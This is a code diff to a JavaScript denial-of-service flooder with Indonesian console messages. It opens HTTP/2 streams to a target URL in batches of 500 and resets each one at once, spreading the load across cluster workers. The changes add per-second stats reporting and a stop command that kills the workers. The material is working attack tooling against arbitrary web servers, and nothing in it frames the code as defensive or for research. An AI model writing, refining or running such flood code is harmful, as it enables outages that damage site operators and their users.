@@ -13,6 +13,20 @@ const userAgents = [
 
 function executeAttack(targetUrl, durationSeconds) { // This function runs in the worker process
     const streamsPerLoop = 500;
+    let localSent = 0;
+    let localError = 0;
+
+    const statsInterval = setInterval(() => {
+        if (process.send) {
+            process.send({
+                type: 'stats',
+                sent: localSent,
+                error: localError
+            });
+        }
+        localSent = 0;
+        localError = 0;
+    }, 1000);
 
     const target = url.parse(targetUrl);
     const authority = `${target.protocol}//${target.host}`;
@@ -38,9 +52,9 @@ function executeAttack(targetUrl, durationSeconds) { // This function runs in th
 
         const stream = client.request(headers);
         stream.on('error', () => {
-            if (process.send) process.send({ type: 'stats', error: 1 });
+            localError++;
         });
-        if (process.send) process.send({ type: 'stats', sent: 1 });
+        localSent++;
         stream.destroy();
     };
  
@@ -57,6 +71,7 @@ function executeAttack(targetUrl, durationSeconds) { // This function runs in th
  
     setTimeout(() => {
         isAttackActive = false;
+        clearInterval(statsInterval);
         if (!client.destroyed) {
             client.destroy();
         }
@@ -112,6 +127,18 @@ function startNuclearFlood(targetUrl, durationSeconds, statusCallback) { // This
         cluster.on('exit', (worker) => {
             console.log(`Worker ${worker.process.pid} telah berhenti.`);
         });
+
+        const stopAttack = () => {
+            console.log("Master menerima perintah stop. Menghentikan semua worker.");
+            clearInterval(monitorInterval);
+            for (const id in cluster.workers) {
+                if (cluster.workers[id]) {
+                    cluster.workers[id].kill();
+                }
+            }
+        };
+
+        return { stop: stopAttack };
     }
 }
 
